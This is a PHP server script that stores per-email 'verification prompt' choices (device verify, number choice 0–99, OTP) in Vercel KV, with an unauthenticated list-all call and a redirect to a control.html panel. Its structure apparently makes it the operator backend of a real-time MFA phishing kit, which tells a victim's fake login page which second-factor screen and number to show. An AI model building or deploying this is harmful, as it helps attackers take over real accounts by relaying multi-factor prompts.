<?php
header("Access-Control-Allow-Origin: *");
header("Content-Type: application/json");

$kvUrl = getenv('KV_REST_API_URL');
$kvToken = getenv('KV_REST_API_TOKEN');
$kvKey = 'verify_data';

function kvRequest($method, $url, $token, $endpoint, $body = null) {
    if (!$url || !$token) {
        return ['error' => 'Vercel KV not configured. Add KV_REST_API_URL and KV_REST_API_TOKEN environment variables in the Vercel dashboard.'];
    }

    $ch = curl_init();
    $fullUrl = rtrim($url, '/') . '/' . ltrim($endpoint, '/');
    curl_setopt($ch, CURLOPT_URL, $fullUrl);
    curl_setopt($ch, CURLOPT_RETURNTRANSFER, true);
    curl_setopt($ch, CURLOPT_CUSTOMREQUEST, $method);
    curl_setopt($ch, CURLOPT_HTTPHEADER, [
        'Authorization: Bearer ' . $token,
        'Content-Type: application/json'
    ]);

    if ($body !== null) {
        curl_setopt($ch, CURLOPT_POSTFIELDS, json_encode($body));
    }

    curl_setopt($ch, CURLOPT_TIMEOUT, 10);
    $result = curl_exec($ch);
    $httpCode = curl_getinfo($ch, CURLINFO_HTTP_CODE);
    $curlError = curl_error($ch);
    curl_close($ch);

    if ($curlError) {
        return ['error' => 'KV connection error: ' . $curlError];
    }

    return ['httpCode' => $httpCode, 'result' => $result];
}

function kvGetData($url, $token, $key) {
    $resp = kvRequest('GET', $url, $token, 'get/' . urlencode($key));
    if (isset($resp['error'])) return $resp;
    if ($resp['httpCode'] === 200) {
        $data = json_decode($resp['result'], true);
        if ($data && isset($data['result'])) {
            $val = $data['result'];
            if ($val === null || $val === '') return [];
            return json_decode($val, true) ?: [];
        }
    }
    return [];
}

function kvSetData($url, $token, $key, $data) {
    return kvRequest('POST', $url, $token, 'set/' . urlencode($key), ['value' => json_encode($data)]);
}

if ($_SERVER['REQUEST_METHOD'] === 'GET' && isset($_GET['email']) && !isset($_GET['list'])) {
    $identifier = trim($_GET['email']);
    if (empty($identifier)) {
        http_response_code(400);
        echo json_encode(['error' => 'Identifier required']);
        exit;
    }
    $data = kvGetData($kvUrl, $kvToken, $kvKey);
    if (isset($data['error'])) {
        http_response_code(503);
        echo json_encode($data);
        exit;
    }
    $identifierKey = md5(strtolower($identifier));
    if (isset($data[$identifierKey]) && isset($data[$identifierKey]['prompt_type'])) {
        $response = [
            'prompt_type' => $data[$identifierKey]['prompt_type'],
            'timestamp' => $data[$identifierKey]['timestamp']
        ];
        if ($data[$identifierKey]['prompt_type'] === 'choose_number' && isset($data[$identifierKey]['number'])) {
            $response['number'] = $data[$identifierKey]['number'];
        }
        echo json_encode($response);
    } else {
        echo json_encode(['prompt_type' => null]);
    }
    exit;
}

if ($_SERVER['REQUEST_METHOD'] === 'POST') {
    $identifier = isset($_POST['identifier']) ? trim($_POST['identifier']) : '';
    $promptType = isset($_POST['prompt_type']) ? trim($_POST['prompt_type']) : '';
    if (empty($identifier) || empty($promptType)) {
        http_response_code(400);
        echo json_encode(['error' => 'Identifier and prompt_type required']);
        exit;
    }
    if (!in_array($promptType, ['device_verify', 'choose_number', 'otp'])) {
        http_response_code(400);
        echo json_encode(['error' => 'Invalid prompt_type']);
        exit;
    }
    $data = kvGetData($kvUrl, $kvToken, $kvKey);
    if (isset($data['error'])) {
        http_response_code(503);
        echo json_encode($data);
        exit;
    }
    $identifierKey = md5(strtolower($identifier));
    $verificationData = [
        'identifier' => $identifier,
        'prompt_type' => $promptType,
        'timestamp' => time()
    ];
    if ($promptType === 'choose_number') {
        $number = isset($_POST['number']) ? trim($_POST['number']) : '';
        if ($number === '') {
            echo json_encode(['error' => 'Number required for choose_number prompt']);
            exit;
        }
        if (!is_numeric($number) || strlen($number) < 1 || strlen($number) > 2 || $number < 0 || $number > 99) {
            echo json_encode(['error' => 'Must provide a number between 0-99']);
            exit;
        }
        $verificationData['number'] = (int)$number;
    }
    $data[$identifierKey] = $verificationData;
    $resp = kvSetData($kvUrl, $kvToken, $kvKey, $data);
    if (isset($resp['error'])) {
        http_response_code(503);
        echo json_encode($resp);
        exit;
    }
    echo json_encode(['success' => true, 'message' => 'Verification prompt set']);
    exit;
}

if ($_SERVER['REQUEST_METHOD'] === 'DELETE') {
    $identifier = isset($_GET['email']) ? trim($_GET['email']) : '';
    if (empty($identifier)) {
        http_response_code(400);
        echo json_encode(['error' => 'Identifier required']);
        exit;
    }
    $data = kvGetData($kvUrl, $kvToken, $kvKey);
    if (isset($data['error'])) {
        http_response_code(503);
        echo json_encode($data);
        exit;
    }
    $identifierKey = md5(strtolower($identifier));
    if (isset($data[$identifierKey])) {
        unset($data[$identifierKey]);
        $resp = kvSetData($kvUrl, $kvToken, $kvKey, $data);
        if (isset($resp['error'])) {
            http_response_code(503);
            echo json_encode($resp);
            exit;
        }
        echo json_encode(['success' => true, 'message' => 'Verification prompt cleared']);
    } else {
        echo json_encode(['error' => 'No verification prompt found for this identifier']);
    }
    exit;
}

if ($_SERVER['REQUEST_METHOD'] === 'GET' && !isset($_GET['email']) && !isset($_GET['list'])) {
    header('Location: control.html');
    exit;
}

if ($_SERVER['REQUEST_METHOD'] === 'GET' && isset($_GET['list']) && $_GET['list'] === 'all') {
    $data = kvGetData($kvUrl, $kvToken, $kvKey);
    if (isset($data['error'])) {
        http_response_code(503);
        echo json_encode($data);
        exit;
    }
    $currentTime = time();
    $changed = false;
    foreach ($data as $key => $item) {
        if (($currentTime - $item['timestamp']) > 3600) {
            unset($data[$key]);
            $changed = true;
        }
    }
    if ($changed) {
        kvSetData($kvUrl, $kvToken, $kvKey, $data);
    }
    echo json_encode($data);
    exit;
}
?>